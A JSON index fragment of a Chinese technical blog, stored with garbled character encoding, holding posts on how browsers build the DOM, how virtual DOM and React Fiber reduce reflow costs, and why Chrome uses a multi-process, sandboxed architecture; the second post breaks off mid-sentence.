ç½‘ç»œè¿›ç¨‹è·å–åˆ°çš„htmlå­—èŠ‚æµæ— æ³•ç›´æ¥è¢«æ¸²æŸ“è¿›ç¨‹ç†è§£ï¼Œéœ€è¦è½¬åŒ–æˆæ¸²æŸ“å¼•æ“å¯ä»¥ç†è§£çš„ç»“æ„ã€‚å³DOMã€‚æœ‰ä»¥ä¸‹ä½œç”¨ï¼š\nè¡¨è¿°HTMLçš„å†…éƒ¨æ•°æ®ç»“æ„ å°†Webâ»šé¢å’ŒJavaScriptè„šæœ¬è¿æ¥èµ·æ¥ DOMè§£æé˜¶æ®µå³è¿‡æ»¤ä¸€äº›ä¸å®‰å…¨çš„å†…å®¹ æ¸²æŸ“å¼•æ“å†…éƒ¨é€šè¿‡HTMLè§£æå™¨(HTMLParser)å°†HTMLå­—èŠ‚æµè½¬åŒ–ä¸ºDOMç»“æ„\n2ã€DOMçš„å…·ä½“ç”Ÿæˆæµç¨‹ï¼š ç½‘ç»œè¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹å»ºç«‹ä¸€ä¸ªæµå¼ç®¡é“ï¼ŒHTMLè§£æå™¨ç›´æ¥è§£æï¼Œ ä¸éœ€è¦ç­‰å¾…text/htmlç±»å‹çš„æ¥å£æ¥å—å®Œæ¯•å†è¿›è¡Œè§£æ\nå›¾ï¼šå­—èŠ‚æµè½¬æ¢ä¸ºDOM\nç¬¬ä¸€ä¸ªé˜¶æ®µï¼Œé€šè¿‡åˆ†è¯å™¨å°†å­—èŠ‚æµè½¬æ¢ä¸ºToken ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªé˜¶æ®µåŒæ­¥è¿›è¡Œï¼Œéœ€è¦å°†Tokenè§£æä¸ºDOMèŠ‚ç‚¹ï¼Œå¹¶å°†DOMèŠ‚ç‚¹æ·»åŠ åˆ°DOM æ ‘ä¸­ HTMLè§£æå™¨å¼€å§‹å·¥ä½œæ—¶ï¼Œä¼šé»˜è®¤åˆ›å»ºäº†ä¸€ä¸ªæ ¹ä¸ºdocumentçš„ç©ºDOMç»“æ„ã€‚åŒæ—¶ä¼šå°†ä¸€ä¸ªStartTag documentçš„Tokenå‹å…¥æ ˆåº•ã€‚ç„¶åç»è¿‡åˆ†è¯å™¨è§£æå‡ºæ¥çš„ç¬¬ä¸€ä¸ªStartTag html Tokenä¼š è¢«å‹å…¥åˆ°æ ˆä¸­ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªhtmlçš„DOMèŠ‚ç‚¹ï¼Œæ·»åŠ åˆ°documentä¸Š\nå›¾ï¼šè§£æåˆ°StartTag htmlæ—¶çš„çŠ¶æ€\nå›¾ï¼šè§£æå‡ºç¬¬ä¸€ä¸ªæ–‡æœ¬Tokenæ—¶çš„çŠ¶æ€\nå›¾ï¼šå…ƒç´ å¼¹å‡ºTokenæ ˆç¤ºæ„å›¾\n3.DOMç¼ºé™·ï¼šDOMæ ‘æ„å»ºè¢«JSå’ŒCSSæ–‡ä»¶å½±å“ JavaScriptæ–‡ä»¶çš„ä¸‹è½½è¿‡ç¨‹ä¼šé˜»å¡DOMè§£æ\né¢„è§£ææ“ä½œï¼šå¦‚æœJavaScriptæ–‡ä»¶ä¸­æ²¡æœ‰æ“ä½œ DOMç›¸å…³ä»£ç ï¼Œå°±å¯ä»¥å°†è¯¥JavaScriptè„šæœ¬è®¾ç½®ä¸ºå¼‚æ­¥åŠ è½½ï¼Œé€šè¿‡async æˆ–deferæ¥æ ‡è®°ä»£ç \n\u0026lt;script async type=\u0026#34;text/javascript\u0026#34; src=\u0026#39;foo.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; JavaScriptä¼šé˜»å¡DOMç”Ÿæˆï¼Œè€Œæ ·å¼æ–‡ä»¶åˆä¼šé˜»å¡JavaScriptçš„æ‰§è¡Œ\näºŒã€è™šæ‹ŸDOMï¼šè™šæ‹ŸDOMå’Œå®é™…çš„DOMæœ‰ä½•ä¸åŒï¼Ÿ Javascriptç›´æ¥æ“ä½œDOMå¯èƒ½ä¼šå¼•èµ·é‡æ’ã€é‡ç»˜ç­‰æ“ä½œ(å¼ºåˆ¶åŒæ­¥å¸ƒå±€å’Œå¸ƒå±€æŠ– åŠ¨)å¼•èµ·æ€§èƒ½é—®é¢˜ã€‚è™šæ‹ŸDOMä½œä¸ºä¸­é—´å±‚æ¥ä¼˜åŒ–domçš„æ“ä½œ(æ‰¹é‡æ›´æ–°domï¼Œä¼˜åŒ–æ›´æ–°domç»†èŠ‚)ã€‚ä¹‹åä»åŒç¼“å­˜å’ŒMVCæ¨¡å‹çš„â»†åº¦æ¥è§£æäº†è™šæ‹ŸDOM\né¢‘ç¹DOMæ“ä½œéå¸¸æ¶ˆè€—æµè§ˆå™¨æ€§çš„ï¼Œè™šæ‹ŸDOMæ ¸å¿ƒæ˜¯å°†æ‰¹é‡DOMæ“ä½œåçš„å˜åŒ–ä¸€æ¬¡æ€§æ›´æ–°åˆ°æµè§ˆå™¨\n1ã€DOMç¼ºé™·åŠè™šæ‹ŸDOMæ˜¯å¦‚ä½•è§£å†³çš„ 1.DOMçš„ä¸€äº›ç¼ºé™·\né€šè¿‡ JavaScriptæ“çºµDOMæ˜¯ä¼šå½±å“åˆ°æ•´ä¸ªæ¸²æŸ“æµæ°´çº¿çš„ ä½¿ç”¨DOMæä¾›çš„JavaScriptæ¥å£æ¥éå†æˆ–è€…ä¿®æ”¹èŠ‚ç‚¹ ä»¥ä¸Šä¸¤ç§æ“ä½œéƒ½ä¼šå¼•èµ·é‡æ’ã€é‡ç»˜æˆ–åˆæˆæ“ä½œâ€œç‰µä¸€å‘è€ŒåŠ¨å…¨èº«â€ã€‚å¦å¤–ï¼ŒDOMä¸­ä¸å½“æ“ä½œè¿˜å¯èƒ½å¼•å‘å¼ºåˆ¶åŒæ­¥å¸ƒå±€å’Œå¸ƒå±€æŠ–åŠ¨é—®é¢˜ï¼Œå¤§å¤§é™ä½æ¸²æŸ“æ•ˆç‡ã€‚\n2.è™šæ‹ŸDOMæ˜¯å¦‚ä½•è§£å†³è¿™äº›ç¼ºé™·\nâ»šé¢æ”¹å˜çš„å†…å®¹åº”ç”¨åˆ°è™šæ‹ŸDOMä¸Šï¼Œä¸æ˜¯ç›´æ¥åº”ç”¨åˆ°DOMä¸Š å˜åŒ–åº”ç”¨åˆ°è™šæ‹ŸDOMä¸Šæ—¶ï¼Œè™šæ‹ŸDOMå¹¶ä¸æ€¥ç€å»æ¸²æŸ“â»šé¢ï¼Œè€Œæ˜¯è°ƒæ•´è™šæ‹ŸDOMçš„å†…éƒ¨çŠ¶æ€ åœ¨è™šæ‹ŸDOMæ”¶é›†åˆ°è¶³å¤Ÿçš„æ”¹å˜æ—¶ï¼ŒæŠŠè¿™äº›å˜åŒ–ä¸€æ¬¡æ€§åº”ç”¨åˆ°çœŸå®çš„DOMä¸Š å›¾ï¼šç»“åˆReactæµç¨‹è™šæ‹ŸDOMæ‰§è¡Œæµç¨‹\nåˆ›å»ºé˜¶æ®µï¼šä¾æ®JSXå’ŒåŸºç¡€æ•°æ®åˆ›å»ºå‡ºæ¥è™šæ‹ŸDOMï¼Œç”±è™šæ‹ŸDOMæ ‘åˆ›å»ºå‡ºçœŸå®DOMæ ‘ï¼Œå†è§¦å‘æ¸²æŸ“æµæ°´çº¿è¾“å‡ºâ»šé¢ æ›´æ–°é˜¶æ®µï¼šæ•°æ®å˜æ›´ï¼Œæ ¹æ®æ–°æ•°æ®åˆ›å»ºæ–°çš„è™šæ‹ŸDOMæ ‘ï¼Œç»“åˆReact Fiberæ›´æ–°æœºåˆ¶æ‰¾å‡ºå˜åŒ–çš„åœ°æ–¹ï¼ŒæŠŠå˜åŒ–çš„åœ°æ–¹ä¸€æ¬¡æ€§æ›´æ–°åˆ°çœŸå®çš„DOMæ ‘ä¸Šï¼Œè§¦å‘æ¸²æŸ“æµæ°´çº¿ æ¯”è¾ƒä¸¤ä¸ªè™šæ‹ŸDOMçš„è¿‡ç¨‹æ˜¯åœ¨ä¸€ä¸ªé€’å½’å‡½æ•°é‡Œæ‰§è¡Œçš„ï¼Œå…¶ æ ¸å¿ƒç®—æ³•æ˜¯reconciliationã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ¯”è¾ƒè¿‡ç¨‹æ‰§è¡Œå¾—å¾ˆå¿«ï¼Œä¸è¿‡å½“è™šæ‹ŸDOMæ¯”è¾ƒå¤æ‚æ—¶ï¼Œæ‰§è¡Œæ¯”è¾ƒå‡½æ•°å¯èƒ½å æ®ä¸»çº¿ç¨‹æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼Œå¯¼è‡´å…¶ä»–ä»»åŠ¡çš„ç­‰å¾…ï¼Œé€ æˆâ»šé¢å¡é¡¿ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒReactå›¢é˜Ÿé‡å†™äº†reconciliationç®—æ³•ï¼Œæ–°çš„ç®—æ³•ç§°ä¸ºFiber reconcilerï¼Œä¹‹å‰è€çš„ç®—æ³•ç§°ä¸ºStack reconcilerã€‚åç¨‹çš„åˆ«ç§°å°±æ˜¯Fiberï¼Œæ‰€è°“çš„Fiber reconcilerå°±æ˜¯åœ¨æ‰§è¡Œç®—æ³•çš„è¿‡ç¨‹ä¸­å‡ºè®©ä¸»çº¿ç¨‹\n2ã€åœ¨åŒç¼“å­˜å’ŒMVCçš„è§†â»†æ¥èŠèŠè™šæ‹ŸDOM ï¼ˆ1ï¼‰åŒç¼“å­˜\nå›¾åƒæ“ä½œå¤æ‚çš„é¡µé¢ä¸­ï¼Œå®Œæ•´çš„ç”»é¢éœ€è¦å¤šæ¬¡è®¡ç®—å®Œæˆã€‚æ‰€ä»¥ï¼Œå½“å±å¹•ä»å‰ç¼“å†²åŒºè¯»å–æ•°æ®æ˜¾ç¤ºçš„æ—¶å€™ï¼Œå¯èƒ½æ‹¿åˆ°çš„æ˜¯åªè®¡ç®—äº†ä¸€éƒ¨åˆ†çš„å›¾åƒï¼Œå°±ä¼šé€ æˆç”¨æˆ·çœ‹åˆ°çš„å›¾åƒæ˜¯ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œä¹Ÿå°±æ˜¯é¡µé¢çš„é—ªçƒã€‚\nä½¿ç”¨åŒç¼“å­˜ï¼Œè®¡ç®—çš„ä¸­é—´ç»“æœå­˜æ”¾åœ¨å¦ä¸€ä¸ªç¼“å†²åŒºä¸­ï¼Œç­‰å…¨éƒ¨çš„è®¡ç®—ç»“æŸï¼Œè¯¥ç¼“å†²åŒºå·²ç»å­˜å‚¨äº†å®Œæ•´çš„å›¾å½¢ä¹‹åï¼Œå†å°†è¯¥ç¼“å†²åŒºçš„å›¾å½¢æ•°æ®ä¸€æ¬¡æ€§å¤åˆ¶åˆ°æ˜¾ç¤ºç¼“å†²åŒºï¼Œè¿™æ ·å°±ä½¿å¾—æ•´ä¸ªå›¾åƒçš„è¾“å‡ºéå¸¸ç¨³å®š\nåœ¨è¿™é‡Œï¼Œä½ å¯ä»¥æŠŠè™šæ‹ŸDOMçœ‹æˆæ˜¯DOMçš„ä¸€ä¸ªbufferï¼Œå’Œå›¾å½¢æ˜¾ç¤ºä¸€æ ·ï¼Œå®ƒä¼šåœ¨å®Œæˆä¸€æ¬¡å®Œæ•´çš„æ“ä½œä¹‹ åï¼Œå†æŠŠç»“æœåº”ç”¨åˆ°DOMä¸Šï¼Œè¿™æ ·å°±èƒ½å‡å°‘ä¸€äº›ä¸å¿…è¦çš„æ›´æ–°ï¼ŒåŒæ—¶è¿˜èƒ½ä¿è¯DOMçš„ç¨³å®šè¾“å‡º\nï¼ˆ2ï¼‰MVCæ¨¡å¼\nå¯ä»¥æŠŠReactä¸­è™šæ‹ŸDOMçš„éƒ¨åˆ†çœ‹æˆæ˜¯ä¸€ä¸ªMVCä¸­çš„è§†å›¾ï¼Œç»“åˆReduxæä¾›çš„æ§åˆ¶å™¨å’Œæ¨¡å‹æ„å»ºä¸€ä¸ªMVCçš„æ¨¡å‹ç»“æ„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nå›¾ï¼šåŸºäºReactå’ŒReduxæ„å»ºMVCæ¨¡å‹\næ§åˆ¶å™¨ç”¨æ¥ç›‘æ§DOMçš„å˜åŒ–ï¼Œä¸€æ—¦DOMå‘ç”Ÿå˜åŒ–ï¼Œæ§åˆ¶å™¨ä¾¿ä¼šé€šçŸ¥æ¨¡å‹ï¼Œè®©å…¶æ›´æ–°æ•°æ® æ¨¡å‹æ•°æ®æ›´æ–°åï¼Œæ§åˆ¶å™¨é€šçŸ¥è§†å›¾ï¼Œå‘Šè¯‰å®ƒæ¨¡å‹çš„æ•°æ®å‘ç”Ÿäº†å˜åŒ– è§†å›¾æ¥æ”¶åˆ°æ›´æ–°æ¶ˆæ¯åï¼Œæ ¹æ®æ¨¡å‹æ‰€æä¾›çš„æ•°æ®æ¥ç”Ÿæˆæ–°çš„è™šæ‹ŸDOM æ–°çš„è™šæ‹ŸDOMç”Ÿæˆå¥½åï¼Œä¸ä¹‹å‰çš„è™šæ‹ŸDOMè¿›è¡Œæ¯”è¾ƒï¼Œæ‰¾å‡ºå˜åŒ–çš„èŠ‚ç‚¹ æ¯”è¾ƒå‡ºå˜åŒ–çš„èŠ‚ç‚¹åï¼ŒReactå°†å˜åŒ–çš„è™šæ‹ŸèŠ‚ç‚¹åº”ç”¨åˆ°DOMä¸Šï¼Œè§¦å‘DOMèŠ‚ç‚¹æ›´æ–° DOMèŠ‚ç‚¹çš„å˜åŒ–è§¦å‘åç»­ä¸€ç³»åˆ—æ¸²æŸ“æµæ°´çº¿å˜åŒ–ï¼Œä»è€Œå®ç°â»šé¢çš„æ›´æ–° æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/09.dom-tree-and-virtual-dom-tree/","summary":"\u003cp\u003eæ¸²æŸ“æµæ°´çº¿ä¸­ï¼ŒDOMæ ‘æœ¬èº«çš„ç¼ºé™·å¾ˆå®¹æ˜“å¼•èµ·é‡æ’ã€é‡ç»˜ç­‰æ€§èƒ½é—®é¢˜ï¼Œåæ¥æœ‰äº†è™šæ‹ŸDOMçš„\u0026hellip;\u003c/p\u003e","title":"æµè§ˆå™¨: DOMæ ‘å’Œè™šæ‹ŸDOMæ ‘"},{"content":"å®è§‚è§†è§’ä¸‹ï¼ŒèŠä¸€ä¸‹æµè§ˆå™¨ï¼Œä¸ºä»€ä¹ˆæ‰“å¼€1ä¸ªé¡µé¢ï¼Œå´æœ‰4ä¸ªè¿›ç¨‹? ä»¥åŠä¸ºä»€ä¹ˆChromeç»“æ„ä¼šå‘å±•æˆå¦‚ä»Šçš„å¤šçº¿ç¨‹æ¨¡å¼?\nchromeã€å¾®è½¯çš„Edgeä»¥åŠå›½å†…çš„å¤§éƒ¨åˆ†ä¸»æµæµè§ˆå™¨ï¼Œéƒ½æ˜¯åŸºäºChromiumäºŒæ¬¡å¼€å‘è€Œæ¥\nç‚¹å‡»Chromeæµè§ˆå™¨å³ä¸Šè§’â€é€‰é¡¹-\u0026gt;æ›´å¤šå·¥å…·-\u0026gt;ä»»åŠ¡ç®¡ç†å™¨â€œï¼ŒæŸ¥çœ‹è¿›ç¨‹\nä¸€ã€å‡ ä¸ªæ¦‚å¿µï¼šè¿›ç¨‹ã€çº¿ç¨‹å’Œå¹¶è¡Œå¤„ç† è¿›ç¨‹ï¼šä¸€ä¸ªè¿›ç¨‹å°±æ˜¯ä¸€ä¸ªç¨‹åºçš„è¿è¡Œå®ä¾‹ çº¿ç¨‹ï¼šçº¿ç¨‹æ˜¯ä¸èƒ½å•ç‹¬å­˜åœ¨çš„ï¼Œç”±è¿›ç¨‹æ¥å¯åŠ¨å’Œç®¡ç† å¹¶è¡Œå¤„ç†ï¼šè®¡ç®—æœºä¸­çš„å¹¶è¡Œå¤„ç†å°±æ˜¯åŒä¸€æ—¶åˆ»å¤„ç†å¤šä¸ªä»»åŠ¡ã€‚å¤šçº¿ç¨‹å¯ä»¥å¹¶è¡Œå¤„ç†ä»»åŠ¡ å¯åŠ¨ä¸€ä¸ªç¨‹åºçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºè¯¥ç¨‹åºåˆ›å»ºä¸€å—å†…å­˜ï¼Œç”¨æ¥å­˜æ”¾ä»£ç ã€è¿è¡Œä¸­çš„æ•°æ®å’Œä¸€ä¸ªæ‰§è¡Œä»»åŠ¡çš„ä¸»çº¿ç¨‹ã€‚è¿™æ ·çš„ä¸€ä¸ªè¿è¡Œç¯å¢ƒå«è¿›ç¨‹\nå›¾ï¼šå•çº¿ç¨‹ä¸å¤šçº¿ç¨‹çš„è¿›ç¨‹å¯¹æ¯”å›¾\næ˜¾ç„¶ï¼Œçº¿ç¨‹æ˜¯ä¾é™„äºè¿›ç¨‹çš„ï¼Œè€Œè¿›ç¨‹ä¸­ä½¿ç”¨å¤šçº¿ç¨‹å¹¶è¡Œå¤„ç†èƒ½æå‡è¿è¡Œæ•ˆç‡\nè¿›ç¨‹å’Œçº¿ç¨‹ä¹‹é—´çš„å…³ç³»æœ‰4ç‚¹ï¼š\nè¿›ç¨‹ä¸­çš„ä»»ä¸€çº¿ç¨‹æ‰§è¡Œå‡ºé”™ï¼Œéƒ½ä¼šå¯¼è‡´æ•´ä¸ªè¿›ç¨‹å´©æºƒ çº¿ç¨‹ä¹‹é—´å…±äº«è¿›ç¨‹ä¸­çš„æ•°æ® è¿›ç¨‹å…³é—­ï¼Œæ“ä½œç³»ç»Ÿä¼šå›æ”¶è¿›ç¨‹æ‰€å ç”¨çš„å†…å­˜ è¿›ç¨‹æ­£å¸¸é€€å‡º æŸçº¿ç¨‹æ“ä½œä¸å½“å¯¼è‡´å†…å­˜æ³„æ¼ï¼Œè‡³è¿›ç¨‹é€€å‡º è¿›ç¨‹ä¹‹é—´å†…å®¹ç›¸äº’éš”ç¦»ã€‚è¿›ç¨‹ä¹‹é—´çš„æ•°æ®é€šä¿¡ï¼Œä¾èµ–è¿›ç¨‹é—´é€šä¿¡(IPC)æœºåˆ¶ å›¾ï¼šçº¿ç¨‹ä¹‹é—´å…±äº«è¿›ç¨‹ä¸­çš„æ•°æ®ç¤ºæ„å›¾\nä¸Šå›¾ç¤ºï¼Œçº¿ç¨‹1ã€çº¿ç¨‹2ã€çº¿ç¨‹3åˆ†åˆ«æŠŠæ‰§è¡Œçš„ç»“æœå†™å…¥Aã€Bã€Cä¸­ï¼Œç„¶åçº¿ç¨‹2ç»§ç»­ä»Aã€Bã€Cä¸­è¯»å–æ•°æ®ï¼Œç”¨æ¥æ˜¾ç¤ºæ‰§è¡Œç»“æœ\nè¿›ç¨‹éš”ç¦»ç‰¹æ•ˆï¼š\næ¯ä¸€ä¸ªè¿›ç¨‹åªèƒ½è®¿é—®è‡ªå·±å æœ‰çš„æ•°æ®ï¼Œé¿å…å‡ºç°è¿›ç¨‹Aå†™å…¥æ•°æ®åˆ°è¿›ç¨‹Bçš„æƒ…å†µã€‚ è¿›ç¨‹ä¹‹é—´çš„æ•°æ®æ˜¯ä¸¥æ ¼éš”ç¦»çš„ï¼Œæ‰€ä»¥ä¸€ä¸ªè¿›ç¨‹å¦‚æœå´©æºƒäº†ï¼Œæˆ–è€…æŒ‚èµ·äº†ï¼Œæ˜¯ä¸ä¼šå½±å“åˆ°å…¶ä»–è¿›ç¨‹çš„ äºŒã€æµè§ˆå™¨å‘å±•å² å‡ å¤§æ¨¡å—ï¼šç½‘ç»œã€æ’ä»¶ã€JavaScriptè¿è¡Œç¯å¢ƒã€æ¸²æŸ“å¼•æ“å’Œâ»šé¢\n1ã€å•è¿›ç¨‹æµè§ˆå™¨ æµè§ˆå™¨æ‰€æœ‰åŠŸèƒ½æ¨¡å—éƒ½è¿è¡Œåœ¨ä¸€ä¸ªè¿›ç¨‹é‡Œ\nå›¾ï¼šå•è¿›ç¨‹æµè§ˆå™¨æ¶æ„ç¤ºæ„å›¾\næ‰€æœ‰â»šé¢çš„æ¸²æŸ“æ¨¡å—ã€JavaScriptæ‰§è¡Œç¯å¢ƒä»¥åŠæ’ä»¶éƒ½è¿è¡Œåœ¨åŒä¸€ä¸ªé¡µé¢çº¿ç¨‹ä¸­ï¼Œæ„å‘³ç€åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªæ¨¡å—å¯ä»¥æ‰§è¡Œã€‚è„šæœ¬ã€æ’ä»¶ç”šè‡³é¡µé¢å†…å­˜æ³„æ¼éƒ½æ˜¯å•è¿›ç¨‹å˜æ…¢çš„é‡è¦åŸå› \né—®é¢˜ï¼š\nä¸ç¨³å®š: æ’ä»¶çš„æ„å¤–å´©æºƒã€æ¸²æŸ“å¼•æ“æ¨¡å—æ‰§è¡Œå¤æ‚JavaScriptå¯¼è‡´å´©æºƒ ä¸æµç•…: è„šæœ¬æ— é™å¾ªç¯ã€é¡µé¢å†…å­˜æ³„æ¼ã€é¡µé¢å…³é—­å†…å­˜æ— æ³•å®Œå…¨å›æ”¶å¯¼è‡´å†…å­˜å ç”¨é«˜ ä¸å®‰å…¨: æ’ä»¶å’Œâ»šé¢è„šæœ¬ é€šè¿‡æ’ä»¶å¯ä»¥è·å–åˆ°æ“ä½œç³»ç»Ÿçš„ä»»æ„èµ„æºï¼Œå½“ä½ åœ¨â»šé¢è¿è¡Œä¸€ä¸ªæ’ä»¶æ—¶ä¹Ÿå°±æ„å‘³ç€è¿™ä¸ªæ’ä»¶èƒ½å®Œå…¨æ“ä½œä½ çš„ç”µè„‘ã€‚å¦‚æœæ˜¯ä¸ªæ¶æ„æ’ä»¶ï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥é‡Šæ”¾ç—…æ¯’ã€çªƒå–ä½ çš„è´¦å·å¯†ç ï¼Œå¼•å‘å®‰å…¨æ€§é—®é¢˜\nâ»šé¢è„šæœ¬å¯ä»¥é€šè¿‡æµè§ˆå™¨çš„æ¼æ´æ¥è·å–ç³»ç»Ÿæƒé™ï¼Œå¯¹ä½ çš„ç”µè„‘åšä¸€äº›æ¶æ„çš„äº‹æƒ…ï¼ŒåŒæ ·ä¹Ÿä¼šå¼•å‘å®‰å…¨é—®é¢˜\n2ã€å¤šè¿›ç¨‹æµè§ˆå™¨æ—¶ä»£: 08å¹´Chromeå‘å¸ƒæ—¶çš„è¿›ç¨‹æ¶æ„ å›¾ï¼šæ—©æœŸChromeè¿›ç¨‹æ¶æ„å›¾\nå¦‚å›¾æ‰€ç¤ºï¼š\nChromeçš„â»šé¢è¿è¡Œåœ¨å•ç‹¬çš„æ¸²æŸ“è¿›ç¨‹ä¸­ â»šé¢é‡Œçš„æ’ä»¶ä¹Ÿè¿è¡Œåœ¨å•ç‹¬çš„æ’ä»¶è¿›ç¨‹ä¸­ è¿›ç¨‹ä¹‹é—´æ˜¯é€šè¿‡IPCæœºåˆ¶è¿›è¡Œé€šä¿¡(å¦‚å›¾ä¸­è™šçº¿éƒ¨åˆ†) (1) è§£å†³ä¸ç¨³å®šé—®é¢˜\nè¿›ç¨‹ç›¸äº’éš”ç¦»ï¼Œå½“ä¸€ä¸ªâ»šé¢æˆ–è€…æ’ä»¶å´©æºƒæ—¶ï¼Œå½±å“åˆ°çš„ä»…ä»…æ˜¯å½“å‰çš„â»šé¢è¿›ç¨‹æˆ–è€…æ’ä»¶è¿›ç¨‹ï¼Œå¹¶ä¸ä¼šå½±å“åˆ°æµè§ˆå™¨å’Œå…¶ä»–â»šé¢ã€‚é¿å…â»šé¢æˆ–è€…æ’ä»¶çš„å´©æºƒå¯¼è‡´æ•´ä¸ªæµè§ˆå™¨å´©æºƒã€‚\n(2) è§£å†³ä¸æµç•…çš„é—®é¢˜\nJavaScriptè¿è¡Œåœ¨æ¸²æŸ“è¿›ç¨‹ä¸­ï¼Œæ‰€ä»¥å³ä½¿JavaScripté˜»å¡äº†æ¸²æŸ“è¿›ç¨‹ï¼Œå½±å“åˆ°çš„ä¹Ÿåªæ˜¯å½“å‰çš„æ¸²æŸ“â»šé¢ï¼Œè€Œå¹¶ä¸ä¼šå½±å“æµè§ˆå™¨å’Œå…¶ä»–â»šé¢ã€‚å…¶ä»–â»šé¢çš„è„šæœ¬æ˜¯è¿è¡Œåœ¨å®ƒä»¬è‡ªå·±çš„æ¸²æŸ“è¿›ç¨‹ä¸­çš„\nå†…å­˜æ³„æ¼çš„è§£å†³æ–¹æ³•ï¼šå…³é—­ä¸€ä¸ªâ»šé¢ï¼Œæ•´ä¸ªæ¸²æŸ“è¿›ç¨‹ä¼šè¢«å…³é—­ï¼Œè¯¥è¿›ç¨‹æ‰€å ç”¨çš„å†…å­˜éƒ½ä¼šè¢«ç³»ç»Ÿå›æ”¶ï¼Œè¿™æ ·å°±è§£å†³äº†æµè§ˆå™¨â»šé¢çš„å†…å­˜æ³„æ¼é—®é¢˜\n(3) å®‰å…¨é—®é¢˜\nChromeæŠŠæ’ä»¶è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹é”åœ¨å®‰å…¨æ²™ç®±é‡Œé¢ï¼Œè¿™æ ·å³ä½¿åœ¨æ¸²æŸ“è¿›ç¨‹æˆ–è€…æ’ä»¶è¿›ç¨‹é‡Œé¢æ‰§è¡Œäº†æ¶æ„ç¨‹åºï¼Œæ¶æ„ç¨‹åºä¹Ÿæ— æ³•çªç ´æ²™ç®±å»è·å–ç³»ç»Ÿæƒé™\n3ã€å¤šè¿›ç¨‹æµè§ˆå™¨æ—¶ä»£: 21å¹´æœ€æ–°çš„Chromeè¿›ç¨‹æ¶æ„å›¾ å›¾ï¼šæœ€æ–°çš„Chromeè¿›ç¨‹æ¶æ„å›¾ï¼ˆ21å¹´ï¼‰\næœ€æ–°çš„Chromeæµè§ˆå™¨åŒ…æ‹¬: 1ä¸ªæµè§ˆå™¨(Browser)ä¸»è¿›ç¨‹ã€1ä¸ª GPU è¿›ç¨‹ã€1ä¸ªç½‘ç»œ (NetWork)è¿›ç¨‹ã€å¤šä¸ªæ¸²æŸ“è¿›ç¨‹å’Œå¤šä¸ªæ’ä»¶è¿›ç¨‹\næµè§ˆå™¨è¿›ç¨‹ï¼šè´Ÿè´£ç•Œé¢æ˜¾ç¤ºã€ç”¨æˆ¶äº¤äº’ã€å­è¿›ç¨‹ç®¡ç†ï¼Œæä¾›å­˜å‚¨ç­‰åŠŸèƒ½ æ¸²æŸ“è¿›ç¨‹: æ ¸å¿ƒä»»åŠ¡æ˜¯å°† HTMLã€CSS å’Œ JavaScript è½¬æ¢ä¸ºç”¨æˆ¶å¯ä»¥ä¸ä¹‹äº¤äº’çš„ç½‘â»šï¼Œæ’ç‰ˆå¼•æ“Blinkå’Œ JavaScriptå¼•æ“V8éƒ½æ˜¯è¿è¡Œåœ¨è¯¥è¿›ç¨‹ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒChromeä¼šä¸ºæ¯ä¸ªTabæ ‡ç­¾åˆ›å»ºä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæ¸²æŸ“è¿›ç¨‹éƒ½æ˜¯è¿è¡Œåœ¨æ²™ç®±æ¨¡å¼ä¸‹ GPUè¿›ç¨‹ï¼šä½¿ç”¨åˆè¡·æ˜¯ä¸ºäº†å®ç°3D CSSçš„æ•ˆæœï¼Œéšåç½‘â»šã€Chromeçš„UIç•Œé¢éƒ½é€‰æ‹©é‡‡ç”¨GPUæ¥ç»˜åˆ¶ ç½‘ç»œè¿›ç¨‹ï¼šé¡µé¢ç½‘ç»œèµ„æºåŠ è½½ æ’ä»¶è¿›ç¨‹ï¼šæ’ä»¶è¿è¡Œ æ‰€ä»¥è¿™å°±æ˜¯ä¸ºä»€ä¹ˆï¼šä»…ä»…æ‰“å¼€äº†1ä¸ªâ»šé¢ï¼Œä¸ºä»€ä¹ˆæœ‰4ä¸ªè¿›ç¨‹ï¼Ÿ\nå› ä¸ºæ‰“å¼€1ä¸ªâ»šé¢è‡³å°‘éœ€è¦1ä¸ªç½‘ç»œè¿›ç¨‹ã€1ä¸ªæµè§ˆå™¨è¿›ç¨‹ã€1ä¸ªGPUè¿›ç¨‹ä»¥åŠ1ä¸ªæ¸²æŸ“è¿›ç¨‹\nå¤šè¿›ç¨‹æ¨¡å‹æå‡äº†æµè§ˆå™¨çš„ç¨³å®šæ€§ã€æµç•…æ€§å’Œå®‰å…¨æ€§ã€‚ä½†ä¹Ÿé¢ä¸´ä¸€äº›é—®é¢˜ï¼š\næ›´é«˜çš„èµ„æºå ç”¨: 